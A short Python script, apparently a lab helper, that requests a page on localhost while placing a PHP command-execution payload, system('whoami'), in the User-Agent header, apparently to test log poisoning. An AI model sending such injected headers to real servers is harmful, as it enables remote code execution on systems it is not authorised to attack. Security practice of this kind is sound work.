#!/usr/bin/env python3
"""
change_headers.py - Script to change the headers sent to the site.

"""

import requests

url = 'http://localhost:80/'
headers = {
    "User-Agent": "<?php system('whoami'); ?>",
    "Accept": "*/*",
    "Host": "localhost:80",
    "Accept-Encoding": "gzip, deflate",
}

# Launch the request
request = requests.get(url, headers=headers)
print(request.text)
